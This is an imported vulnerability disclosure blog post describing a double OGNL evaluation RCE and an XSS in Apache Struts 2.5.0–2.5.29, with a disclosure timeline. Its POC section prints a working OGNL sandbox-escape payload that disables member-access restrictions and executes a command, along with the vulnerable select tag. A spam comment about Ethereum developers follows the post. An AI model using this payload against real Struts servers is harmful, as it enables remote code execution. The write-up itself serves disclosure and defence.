---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-05-25_2nd-rce-and-xss-in-apache-struts-before-2530.md
original_filename: 2022-05-25_2nd-rce-and-xss-in-apache-struts-before-2530.md
title: 2nd RCE and XSS in Apache Struts before 2.5.30
category: documents
detected_topics:
- xss
- command-injection
- mfa
- otp
- automation-abuse
- api-security
tags:
- imported
- documents
- xss
- command-injection
- mfa
- otp
- automation-abuse
- api-security
language: en
raw_sha256: 94effcd7f9b2b5d7689453020ed0ab414233fd70c32491ea5bc25954e8e3ae3d
text_sha256: 12e567ca2d729f15e4ff6b58f6058bf39734f81f88fe9f580ca80dd7173debb9
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: true
---

# 2nd RCE and XSS in Apache Struts before 2.5.30

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-05-25_2nd-rce-and-xss-in-apache-struts-before-2530.md
- Source Type: markdown
- Detected Topics: xss, command-injection, mfa, otp, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: True
- Raw SHA256: `94effcd7f9b2b5d7689453020ed0ab414233fd70c32491ea5bc25954e8e3ae3d`
- Text SHA256: `12e567ca2d729f15e4ff6b58f6058bf39734f81f88fe9f580ca80dd7173debb9`


## Content

---
title: "2nd RCE and XSS in Apache Struts before 2.5.30"
url: "https://mc0wn.blogspot.com/2022/05/2nd-rce-and-xss-in-apache-struts-before-2530.html"
final_url: "https://mc0wn.blogspot.com/2022/05/2nd-rce-and-xss-in-apache-struts-before-2530.html"
authors: ["Chris (@mc_0wn)"]
programs: ["Apache Struts"]
bugs: ["RCE", "Double OGNL evaluation", "XSS"]
publication_date: "2022-05-25"
added_date: "2022-12-05"
source: "pentester.land/writeups.json"
original_index: 2607
---

###  2nd RCE and XSS in Apache Struts before 2.5.30 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

\-  [ May 25, 2022  ](https://mc0wn.blogspot.com/2022/05/2nd-rce-and-xss-in-apache-struts-before-2530.html "permanent link")

# 2nd RCE and XSS in Apache Struts 2.5.0 - 2.5.29

## Abstract

In early April 2021 I disclosed a 0day on Apache Struts 2.5.0-2.5.29 [here](https://mc0wn.blogspot.com/2021/04/exploiting-struts-rce-on-2526.html) after responsibly disclosing it and eventually getting permission from Apache Struts. However, I decided to keep digging and found a second, new RCE caused by double OGNL evaluation via a different vector which I'll be describing here. 

  

If you want to know more about Apache Struts RCEs via OGNL evaluations I highly recommend checking out the work by Man Yue Mo and Alvaro Munoz. You can find it here:

[https://securitylab.github.com/research/apache-struts-double-evaluation/…  
](https://t.co/KD8CengJZJ?amp=1)[https://securitylab.github.com/advisories/GHSL](https://t.co/lmfaKcjKl1?amp=1)

  

## Vulnerability Analysis

OGNL evaluations are exploitable when OGNL code is evaluated twice. This is often done when the "findString" or "findValue" function are called consecutively inside an object like Component or UIBean object. In order to find these issues you typically search through java files to find where a second call to findString or findValue is called on a user defined value. 

  

However, reading through the work mentioned above by Man Yue Mo and Alvaro Munoz you'll notice you can also find OGNL evaluations in other parts of code including .ftl FreeMarker files. In this case the Apache Freemarker [syntax](https://freemarker.apache.org/docs/dgui_template_exp.html) is different, but similar issues can exist. These files in struts are typically used to define how an element will present itself in the final html code. 

  

Looking at the select.ftl file I noticed a double OGNL evaluation was occurring in the '**listValueKey** ' . 

  

First at [line 73](https://github.com/apache/struts/blob/master/core/src/main/resources/template/simple/select.ftl#L73) when it assigns valueKey to the result of findString on listValueKey.
  
  
  <#assign valueKey = stack.findString(parameters.listValueKey)!'' />

  

Second at [line 75](https://github.com/apache/struts/blob/master/core/src/main/resources/template/simple/select.ftl#L75) when it calls getText.
  
  
  <#assign itemValue = struts.getText(valueKey) />

However, unlike findString and findValue functions getText ultimately calls [StrutsUtil.java getText](https://github.com/apache/struts/blob/49a4d6d5a11227314a5412935b31989fad3bffc9/core/src/main/java/org/apache/struts2/util/StrutsUtil.java#L128). In particular it calls this line:
  
  
  return (String) stack.findValue("getText('" + text + "')");

This made things a bit different. When passing in text = "3*3", it evaluated to 9. However, when passing in text = "#application" or "#application.toString()" it would return a blank value rather than the string of the application object. So it must mean that getText has a limitation on what values it can query. 

  

Since the select.ftl file already ran findString the 'text' value being passed is the user defined value in this case. This means I can provide whatever string value as the "text" in StrutsUtil.getText and since text isn't escaped all special characters can be provided as well. 

  

So passing **_text = a') + #application + getText('b_** will result in: **_stack.findValue("getText('a') + #application + getText('b')")_** which allows you to evaluate variables outside of the 'getText()' limited function. From there you can once again create your sandbox escape and reach RCE. 

  

## POC

Using the previous sandbox escape found at here:

  

This ends up being a url encoded version of:
  
  
  a') + (#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
  (#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
  (#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
  (#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +
  (#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
  (#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +
  (#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
  (#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
  (#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc.exe'})) + getText('b

  

An example of vulnerable struts element this would apply to is the following where the listValueKey of a select object would be affected:

  

  
  
  <s:select label="Pets"
  name="petIds"
  list="#{'01':'Jan', '02':'Feb'}"
  listValueKey="%{userValue}"
  listValue="name"
  multiple="true"
  size="3"
  required="true"
  value="abc"
  />

_Here's the POC in action:_

_  
_

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjK-xdxygb2nvkxBUAbhMRi20-mNaa-w6jEbiBGgxukE14OzF4JI3I9MeZ412P64WH6JzWEnEXgqCPjxgHKdgq5pntwtVynfnizIiU0q3o6HrLxnmfQFwN-NZaYQWCdqwANnPVQ7HovFsie0ne_J0zvFBiJJ6fMJ468eOTvYSEWlMAAjCxEC4snKzbZbA/w640-h394/2nd%20RCE%20on%20Struts%202.5.29.gif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjK-xdxygb2nvkxBUAbhMRi20-mNaa-w6jEbiBGgxukE14OzF4JI3I9MeZ412P64WH6JzWEnEXgqCPjxgHKdgq5pntwtVynfnizIiU0q3o6HrLxnmfQFwN-NZaYQWCdqwANnPVQ7HovFsie0ne_J0zvFBiJJ6fMJ468eOTvYSEWlMAAjCxEC4snKzbZbA/s1282/2nd%20RCE%20on%20Struts%202.5.29.gif)

  

  

### XSS

There's also a minor XSS issue in the doubleselect element for the 'name' value. This XSS is triggered during an onchange event requiring user interaction. 

  

The onchange value is added to the page because the doubleselect.ftl includes [select.ftl](https://github.com/apache/struts/blob/49a4d6d5a11227314a5412935b31989fad3bffc9/core/src/main/resources/template/simple/doubleselect.ftl#L21)

Which includes [scripting-event.ftl ](https://github.com/apache/struts/blob/49a4d6d5a11227314a5412935b31989fad3bffc9/core/src/main/resources/template/simple/select.ftl#L43), which adds the [onchange event](https://github.com/apache/struts/blob/49a4d6d5a11227314a5412935b31989fad3bffc9/core/src/main/resources/template/simple/scripting-events.ftl#L61)

  

Doubleselect is a UIBean so it gets its 'id' value from the 'name' when id is not set. This uses the  _name_ value instead of random values to populate these fields allowing for a possible XSS issue.

  

<s:doubleselect label="Fruits (OGNL) "  
name="%{empId}" ....>

  

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJkIBQRsCl2YqWlAeYrnQ7YTUfLhW5raoS0jE2CZ4BTDUR7lVJMOo5A6x8HfFGKFbuTJjXg-pVbKHE93kanZ6EsYNGw2TBEtlohIO4-fvxiYOCQX69v5uym3xHPDbNZtpXT50zAxlkSZ0DZ6zlK-ppEYY_L3zFbrM6dYkTtrdUytGkz1ORvtMBUwR9eQ/w640-h347/XSS%20-%20Struts.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJkIBQRsCl2YqWlAeYrnQ7YTUfLhW5raoS0jE2CZ4BTDUR7lVJMOo5A6x8HfFGKFbuTJjXg-pVbKHE93kanZ6EsYNGw2TBEtlohIO4-fvxiYOCQX69v5uym3xHPDbNZtpXT50zAxlkSZ0DZ6zlK-ppEYY_L3zFbrM6dYkTtrdUytGkz1ORvtMBUwR9eQ/s2398/XSS%20-%20Struts.png)

  

  

###  

### Timeline

In between these dates I sent multiple emails explaining the criticality of this issue and answering questions and brief suggestions on mitigations.

  * May 6th 2021 - Submitted a second double OGNL evaluation vulnerability leading to RCE. Also submitted an XSS issue as well to Apache Struts.
  * May 2021 - Got a reply that they are taking it seriously and looking into these issues. 
  * April 5th 2022 - Fixes finally added in 2.5.30. https://struts.apache.org/announce-2022#a20220404 https://github.com/apache/struts/commit/***REDACTED-SUSPECT-TOKEN***  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

### Comments

  1. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Richard Dowson](https://www.blogger.com/profile/08989158855007542060)[July 9, 2023 at 2:45 PM](https://mc0wn.blogspot.com/2022/05/2nd-rce-and-xss-in-apache-struts-before-2530.html?showComment=1688939114935#c6305625783938062499)

Ethereum savvy contract improvement includes making self-executing arrangements that consequently uphold the details of an agreement when certain circumstances are met. Brilliant agreements run on the Ethereum blockchain and are recorded on its public record, making them straightforward, secure, and carefully designed.  
  
They can be utilized both for basic exchanges, such as trading cash or resources, and complex activities, like decentralized trades, casting a ballot frameworks, and production network the executives>> [ethereum developer salary](https://mobilunity.com/blog/hire-top-ethereum-developers-remotely-in-2023/)

Reply[Delete](https://www.blogger.com/comment/delete/1700540390836215996/6305625783938062499)

Replies

Reply

Add comment

Load more...

#### Post a Comment

[](https://www.blogger.com/comment/frame/1700540390836215996?po=2054572396731120212&hl=en&saa=85391&origin=https://mc0wn.blogspot.com&skin=contempo)
